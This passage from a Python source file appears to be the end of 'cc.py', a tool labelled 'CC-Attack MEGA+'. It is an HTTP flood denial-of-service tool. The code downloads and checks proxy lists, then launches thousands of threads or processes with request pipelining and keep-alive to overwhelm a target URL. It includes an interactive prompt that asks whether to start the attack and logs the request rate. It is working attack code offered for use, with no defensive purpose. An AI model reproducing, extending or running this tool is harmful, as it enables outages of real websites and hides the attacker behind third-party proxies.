        while time.time() - start < period and not stop_event.is_set():
            if stop_flag is not None and stop_flag.value:
                break
            time.sleep(0.5)
    finally:
        try:
            result_q.put_nowait(
                (0, 0, 0, handler.stats_sent,
                 handler.stats_errors, handler.stats_bytes))
        except Exception:
            pass
        stop_event.set()
        stop_reporter.set()


def _run_threaded(cfg, proxies, cpu_count):
    Log.warn("Termux/Android detected → using THREADED mode")

    stop_event = threading.Event()

    # ── 🆕 FIX: cfg теперь содержит target/path/port/protocol/proxy_type ──
    handler = CCHandler(
        target=cfg["target"], path=cfg["path"],
        port=cfg["port"], protocol=cfg["protocol"],
        proxies=proxies, proxy_type=cfg["proxy_type"],
        cookies=cfg.get("cookies", ""),
        post_data=cfg.get("post_data", ""),
        brute=cfg.get("brute", False),
        stop_event=stop_event,
        method=cfg.get("method", "GET"),
        technique=cfg.get("technique", "flood"),
        pipeline_depth=cfg["pipeline"],
        keepalive=cfg["keepalive"],
    )

    total_threads = cfg["threads"]
    started = 0
    for _ in range(total_threads):
        try:
            t = threading.Thread(target=handler.run, daemon=True)
            t.start()
            started += 1
        except RuntimeError as e:
            Log.warn(f"OS limit reached (started {started}): {e}")
            break

    Log.info(f"Started {started} threads")

    start = time.time()
    last_sent = 0
    last_time = start

    try:
        while time.time() - start < cfg["period"] and not stop_event.is_set():
            time.sleep(1)
            elapsed = max(1e-6, time.time() - start)
            now = time.time()
            dt = now - last_time
            sent = handler.stats_sent
            inst_rps = (sent - last_sent) / dt if dt > 0 else 0
            last_sent = sent
            last_time = now

            sys.stdout.write(
                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
                f"| {C.RED}errs:{C.RESET} {handler.stats_errors:<7}  "
                f"| {C.YEL}MB:{C.RESET} {handler.stats_bytes / 1048576:>7.2f}"
            )
            sys.stdout.flush()
    except KeyboardInterrupt:
        Log.warn("Interrupt — stopping…")
    finally:
        stop_event.set()
        print()
        total_time = max(1e-6, time.time() - start)
        Log.ok(f"Done. Sent: {handler.stats_sent}, "
               f"errors: {handler.stats_errors}, "
               f"traffic: {handler.stats_bytes / 1048576:.2f} MB, "
               f"avg RPS: {handler.stats_sent / total_time:.0f}")
    return 0


# ─────────────────────────────────────────────────────────────────────────────
#  ПРОКСИ
# ─────────────────────────────────────────────────────────────────────────────
def _is_valid_proxy(host, port):
    if not (0 < port < 65536):
        return False
    h = host.strip("[]")
    try:
        socket.inet_pton(socket.AF_INET, h)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, h)
        return True
    except OSError:
        return False


_PROXY_RE = re.compile(
    r"(?:\[(?P<ip6>[0-9a-fA-F:]+)\]|(?P<ip4>\d{1,3}(?:\.\d{1,3}){3}))"
    r":(?P<port>\d{1,5})"
)


def download_proxies(proxy_ver, out_file):
    src_key = {"4": "socks4", "5": "socks5",
               "http": "http"}.get(proxy_ver, "socks5")
    urls = BUILTIN_PROXY_SOURCES[src_key]
    Log.info(f"Downloading proxies: {len(urls)} sources ({src_key})…")
    seen = set()
    total = 0
    with out_file.open("w", encoding="utf-8") as f:
        for api in urls:
            try:
                r = requests.get(api, timeout=8,
                                 headers={"User-Agent": get_ua()})
                if r.status_code != 200:
                    continue
                for line in re.split(r"[\s,;|]+", r.text):
                    line = line.strip()
                    if not line:
                        continue
                    for m in _PROXY_RE.finditer(line):
                        host = m.group("ip4") or f"[{m.group('ip6')}]"
                        port = int(m.group("port"))
                        if not _is_valid_proxy(
                            m.group("ip4") or m.group("ip6"), port
                        ):
                            continue
                        key = f"{host}:{port}"
                        if key in seen:
                            continue
                        seen.add(key)
                        f.write(key + "\n")
                        total += 1
            except Exception:
                continue
    Log.ok(f"Saved {total} unique proxies → {out_file}")


def normalize_proxy_file(path):
    if not path.exists():
        return
    raw = path.read_text(encoding="utf-8", errors="ignore")
    seen = set()
    keep = []
    bad = 0
    for tok in re.split(r"[\s,;|\"'<>]+", raw):
        if not tok:
            continue
        matched = False
        for m in _PROXY_RE.finditer(tok):
            matched = True
            ip = m.group("ip4") or m.group("ip6")
            port = int(m.group("port"))
            if not _is_valid_proxy(ip, port):
                bad += 1
                continue
            key = f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"
            if key in seen:
                continue
            seen.add(key)
            keep.append(key)
        if not matched and (":" in tok):
            bad += 1
    path.write_text("\n".join(keep) + ("\n" if keep else ""), encoding="utf-8")
    Log.info(f"Normalized: {len(keep)} proxies (discarded: {bad})")


# ─────────────────────────────────────────────────────────────────────────────
#  ЧЕКЕР
# ─────────────────────────────────────────────────────────────────────────────
_CHECK_TARGETS = [
    ("1.1.1.1", 80, b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"),
    ("8.8.8.8", 53, b""),
]


def _check_one_fast(line, proxy_type, ms):
    host, _, port = line.rpartition(":")
    if not host or not port:
        return None
    try:
        port_i = int(port)
    except ValueError:
        return None
    if not _is_valid_proxy(host.strip("[]"), port_i):
        return None
    pt = 4 if proxy_type == 4 else (5 if proxy_type == 5 else 0)
    t0 = time.perf_counter()
    for i, (thost, tport, probe) in enumerate(_CHECK_TARGETS):
        s = None
        try:
            s = socks.socksocket()
            if pt == 4:
                s.set_proxy(socks.SOCKS4, host.strip("[]"), port_i)
            elif pt == 5:
                s.set_proxy(socks.SOCKS5, host.strip("[]"), port_i)
            else:
                s.set_proxy(socks.HTTP, host.strip("[]"), port_i)
            s.settimeout(ms if i == 0 else ms + 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((thost, tport))
            if probe:
                s.sendall(probe)
                if not s.recv(64):
                    raise OSError("empty")
            s.close()
            return (line, int((time.perf_counter() - t0) * 1000))
        except Exception:
            if s is not None:
                try: s.close()
                except Exception: pass
            continue
    return None


def check_proxies(proxies, proxy_type, ms=3, workers=800,
                  autosave_path=None, autosave_every=5, top_n=500):
    if IS_TERMUX:
        workers = min(workers, 200)

    Log.info(f"Checking {len(proxies)} proxies (timeout={ms}s, workers={workers})…")
    alive = []
    done = 0
    total = len(proxies)
    lock = threading.Lock()
    start = time.time()
    last_save = start
    stop_progress = threading.Event()

    def _progress():
        while not stop_progress.is_set():
            time.sleep(1)
            with lock:
                d, a = done, len(alive)
            elapsed = time.time() - start
            rps = d / elapsed if elapsed > 0 else 0
            eta = (total - d) / rps if rps > 0 else 0
            pct = (d / total * 100) if total else 100.0
            try:
                sys.stdout.write(
                    f"\r  > checked {d}/{total} ({pct:5.1f}%)  "
                    f"alive: {a:<5}  speed: {rps:5.0f}/s  ETA: {int(eta):>4}s   "
                )
                sys.stdout.flush()
            except Exception:
                pass

    reporter = threading.Thread(target=_progress, daemon=True)
    reporter.start()

    try:
        with cf.ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_check_one_fast, p, proxy_type, ms): p
                       for p in proxies}
            for fut in cf.as_completed(futures):
                try:
                    result = fut.result()
                except Exception:
                    result = None
                with lock:
                    done += 1
                    if result is not None:
                        alive.append(result)
                    now = time.time()
                    if (autosave_path is not None
                            and now - last_save >= autosave_every
                            and alive):
                        try:
                            autosave_path.write_text(
                                "\n".join(p for p, _ in alive) + "\n",
                                encoding="utf-8")
                        except Exception:
                            pass
                        last_save = now
    finally:
        stop_progress.set()
        reporter.join(timeout=1)
        print()

    alive.sort(key=lambda x: x[1])
    only = [p for p, _ in alive]

    if top_n > 0 and len(only) > top_n:
        Log.ok(f"Kept TOP-{top_n} best proxies (of {len(only)} alive)")
        only = only[:top_n]
    elif top_n > 0:
        Log.ok(f"Alive proxies less than {top_n} — kept all {len(only)}")

    if autosave_path is not None and only:
        try:
            autosave_path.write_text("\n".join(only) + "\n", encoding="utf-8")
        except Exception:
            pass

    Log.ok(f"Working proxies: {len(only)} of {total} "
           f"({len(only) / max(1, total) * 100:.1f}%)")

    if alive:
        Log.info(f"Top-{min(10, len(alive))} fastest:")
        for rank, (proxy, latency) in enumerate(alive[:10], 1):
            print(f"  {rank:>2}. {proxy:<24} {latency:>4} ms")
    return only


# ─────────────────────────────────────────────────────────────────────────────
#  RUN_ATTACK — 🆕 FIX: обновляем cfg всеми полями
# ─────────────────────────────────────────────────────────────────────────────
def run_attack(cfg):
    url = cfg["url"]
    raw = url.strip()
    if raw.startswith("https://"):
        protocol, rest = "https", raw[8:]
    elif raw.startswith("http://"):
        protocol, rest = "http", raw[7:]
    else:
        Log.err("URL must start with http:// or https://"); return 1

    hostport, _, tail = rest.partition("/")
    path = "/" + tail if tail else "/"
    if ":" in hostport:
        target, port_s = hostport.split(":", 1)
        port = int(port_s)
    else:
        target, port = hostport, (443 if protocol == "https" else 80)

    proxy_type = {"4": 4, "5": 5, "http": 0}[cfg["proxy_ver"]]

    # ── 🆕 FIX: пишем разобранные поля обратно в cfg ──
    cfg["target"] = target
    cfg["path"] = path
    cfg["port"] = port
    cfg["protocol"] = protocol
    cfg["proxy_type"] = proxy_type
    cfg.setdefault("cookies", "")
    cfg.setdefault("post_data", "")
    cfg.setdefault("brute", False)
    cfg.setdefault("method", "GET")
    cfg.setdefault("technique", "flood")

    out_file = Path(cfg["out_file"])

    if cfg["down"] or not out_file.exists():
        download_proxies(cfg["proxy_ver"], out_file)

    normalize_proxy_file(out_file)
    proxies = [l.strip() for l in out_file.read_text(
        encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not proxies:
        Log.err("No proxies. Use download."); return 1
    Log.ok(f"Proxies available: {len(proxies)}")

    if cfg["check"]:
        proxies = check_proxies(
            proxies, proxy_type,
            ms=cfg["check_to"], workers=cfg["check_w"],
            autosave_path=out_file, autosave_every=5,
            top_n=cfg["top"],
        )
        if not proxies:
            Log.err("No working proxies."); return 1
        out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")

    Log.info(f"Target  : {protocol}://{target}:{port}{path}")
    Log.info(f"Method  : {cfg.get('method', 'GET')}")
    Log.info(f"Technique: {cfg.get('technique', 'flood')}")

    if IS_TERMUX:
        Log.info(f"THREADED mode | Threads: {cfg['threads']}  |  "
                 f"Pipeline: {cfg['pipeline']}  |  KA: {cfg['keepalive']}")
        return _run_threaded(cfg, proxies, mp.cpu_count())

    cpu_count = mp.cpu_count()
    Log.info(f"MULTIPROCESSING mode | {cpu_count} processes × "
             f"{cfg['threads']} threads = {cpu_count * cfg['threads']} total")

    proc_cfg = {
        "target": target, "path": path,
        "port": port, "protocol": protocol,
        "proxy_type": proxy_type,
        "pipeline": cfg["pipeline"],
        "keepalive": cfg["keepalive"],
        "cookies": cfg.get("cookies", ""),
        "post_data": cfg.get("post_data", ""),
        "brute": cfg.get("brute", False),
        "method": cfg.get("method", "GET"),
        "technique": cfg.get("technique", "flood"),
    }

    try:
        return _run_multiprocessing(cfg, proxies, proc_cfg, cpu_count)
    except Exception as e:
        Log.err(f"Multiprocessing failed: {e}")
        Log.warn("Falling back to THREADED mode…")
        return _run_threaded(cfg, proxies, cpu_count)


# ─────────────────────────────────────────────────────────────────────────────
#  INTERACTIVE CLI
# ─────────────────────────────────────────────────────────────────────────────
def _prompt(label, default=None, cast=str, validator=None):
    suffix = f" [{default}]" if default is not None else ""
    full = f"{C.RED}[*]{C.RESET} {label}{suffix}: "
    while True:
        try:
            raw = input(full).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return default
        if raw == "" and default is not None:
            return default
        try:
            v = cast(raw) if cast is not str else raw
        except (ValueError, TypeError):
            Log.err("Invalid value"); continue
        if validator and not validator(v):
            Log.err("Invalid value"); continue
        return v


def interactive_cli():
    print(f"{C.DIM}{'-' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.WHT}  Interactive attack setup (MEGA+){C.RESET}")
    print(f"{C.DIM}{'-' * 60}{C.RESET}\n")

    while True:
        url = _prompt("Target", default="http://example.com")
        if url.startswith(("http://", "https://")):
            break
        Log.err("URL must start with http:// or https://")

    print(f"{C.DIM}  Methods: {', '.join(ALL_METHODS)}{C.RESET}")
    method = _prompt("Method", default="GET", cast=lambda x: x.upper(),
                     validator=lambda x: x in ALL_METHODS)

    print(f"{C.DIM}  Techniques: {', '.join(TECHNIQUES)}{C.RESET}")
    technique = _prompt("Technique", default="flood",
                        cast=lambda x: x.lower(),
                        validator=lambda x: x in TECHNIQUES)

    print(f"{C.DIM}  Modes: 4 (SOCKS4), 5 (SOCKS5), http{C.RESET}")
    proxy_ver = _prompt("Mode", default="5",
                        validator=lambda x: x in ("4", "5", "http"))

    ans = _prompt("Proxies — download fresh? (y/n)", default="y",
                  cast=lambda x: x.lower())
    down = ans in ("y", "yes", "д", "да", "")

    if IS_TERMUX:
        label_threads = "Threads (total, Termux)"
        default_t = 200
        tmax = 500
    else:
        default_t = max(100, 2000 // max(1, mp.cpu_count()))
        label_threads = f"Threads per process (CPU×{mp.cpu_count()})"
        tmax = 5000

    threads = _prompt(label_threads, default=default_t, cast=int,
                      validator=lambda x: 1 <= x <= tmax)

    period = _prompt("Duration (sec)", default=60, cast=int,
                     validator=lambda x: 1 <= x <= 86400)

    pipeline = _prompt("Pipeline (1..128)", default=PIPELINE_DEPTH,
                       cast=int, validator=lambda x: 1 <= x <= 128)

    keepalive = _prompt("Keep-Alive (1..100000)", default=KEEPALIVE_PER_SOCKET,
                        cast=int, validator=lambda x: 1 <= x <= 100000)

    cookies = _prompt("Cookies", default="")

    ans = _prompt("Brute TCP_NODELAY? (y/n)", default="n",
                  cast=lambda x: x.lower())
    brute = ans in ("y", "yes", "д", "да")

    ans = _prompt("Check proxies? (y/n)", default="y",
                  cast=lambda x: x.lower())
    do_check = ans in ("y", "yes", "д", "да", "")

    check_to = 3
    check_w = 800
    top_n = TOP_ALIVE_DEFAULT
    if do_check:
        check_to = _prompt("Checker timeout (sec)", default=2, cast=int,
                           validator=lambda x: 1 <= x <= 60)
        check_w = _prompt("Checker workers", default=800, cast=int,
                          validator=lambda x: 1 <= x <= 2000)
        top_n = _prompt("Keep TOP-N alive", default=TOP_ALIVE_DEFAULT,
                        cast=int, validator=lambda x: 1 <= x <= 20000)

    print(f"\n{C.DIM}{'-' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.WHT}  Summary (MEGA+){C.RESET}")
    print(f"{C.DIM}{'-' * 60}{C.RESET}")
    print(f"  {C.CYN}Target       :{C.RESET} {url}")
    print(f"  {C.CYN}Method       :{C.RESET} {method}")
    print(f"  {C.CYN}Technique    :{C.RESET} {technique}")
    print(f"  {C.CYN}Mode         :{C.RESET} {proxy_ver}")
    print(f"  {C.CYN}Mode engine  :{C.RESET} {'THREADED' if IS_TERMUX else 'MULTIPROCESSING'}")
    if IS_TERMUX:
        print(f"  {C.CYN}Threads      :{C.RESET} {threads}")
    else:
        print(f"  {C.CYN}Processes    :{C.RESET} {mp.cpu_count()}")
        print(f"  {C.CYN}Threads/proc :{C.RESET} {threads}")
        print(f"  {C.CYN}Total threads:{C.RESET} {mp.cpu_count() * threads}")
    print(f"  {C.CYN}Duration     :{C.RESET} {period}s")
    print(f"  {C.CYN}Pipeline     :{C.RESET} {pipeline}")
    print(f"  {C.CYN}Keep-Alive   :{C.RESET} {keepalive}")
    print(f"  {C.CYN}Cookies      :{C.RESET} {cookies[:30] if cookies else '—'}")
    print(f"  {C.CYN}Brute        :{C.RESET} {'YES' if brute else 'NO'}")
    print(f"  {C.CYN}Download     :{C.RESET} {'YES' if down else 'NO'}")
    print(f"  {C.CYN}Check        :{C.RESET} {'YES' if do_check else 'NO'}"
          + (f" (top-{top_n})" if do_check else ""))
    print(f"{C.DIM}{'-' * 60}{C.RESET}\n")

    ans = _prompt("Start attack? (y/n)", default="y",
                  cast=lambda x: x.lower())
    if ans not in ("y", "yes", "д", "да", ""):
        print("Cancelled.")
        return 0

    cfg = {
        "url": url,
        "method": method,
        "technique": technique,
        "proxy_ver": proxy_ver,
        "threads": threads,
        "period": period,
        "pipeline": pipeline,
        "keepalive": keepalive,
        "out_file": "proxy.txt",
        "cookies": cookies,
        "brute": brute,
        "post_data": "",
        "down": down,
        "check": do_check,
        "check_to": check_to,
        "check_w": check_w,
        "top": top_n,
    }
    return run_attack(cfg)


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    if len(sys.argv) > 1:
        p = argparse.ArgumentParser(prog="cc.py", add_help=False)
        p.add_argument("-h", "-help", "--help", action="store_true")
        p.add_argument("-url")
        p.add_argument("-method", default="GET")
        p.add_argument("-technique", default="flood")
        p.add_argument("-v", default="5")
        p.add_argument("-t", type=int, default=200)
        p.add_argument("-f", default="proxy.txt")
        p.add_argument("-s", type=int, default=60)
        p.add_argument("-cookies", default="")
        p.add_argument("-b", default="0")
        p.add_argument("-down", action="store_true")
        p.add_argument("-check", action="store_true")
        p.add_argument("-check-to", type=int, default=3)
        p.add_argument("-check-w", type=int, default=800)
        p.add_argument("-top", type=int, default=TOP_ALIVE_DEFAULT)
        p.add_argument("-pipeline", type=int, default=PIPELINE_DEPTH)
        p.add_argument("-keepalive", type=int, default=KEEPALIVE_PER_SOCKET)
        args = p.parse_args()

        if args.help:
            print(f"CC-Attack v{VERSION} MEGA+ — by DIDO")
            print(f"Methods: {', '.join(ALL_METHODS)}")
            print(f"Techniques: {', '.join(TECHNIQUES)}")
            return 0

        print_banner()
        cfg = {
            "url": args.url or "",
            "method": args.method,
            "technique": args.technique,
            "proxy_ver": args.v,
            "threads": args.t,
            "period": args.s,
            "pipeline": args.pipeline,
            "keepalive": args.keepalive,
            "out_file": args.f,
            "cookies": args.cookies,
            "brute": args.b == "1",
            "post_data": "",
            "down": args.down,
            "check": args.check,
            "check_to": args.check_to,
            "check_w": args.check_w,
            "top": args.top,
        }
        return run_attack(cfg)

    print_banner()
    try:
        return interactive_cli()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        return 130


if __name__ == "__main__":
    try:
        mp.freeze_support()
        rc = main()
        AsyncLog.shutdown()
        sys.exit(rc)
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        AsyncLog.shutdown()
        sys.exit(130)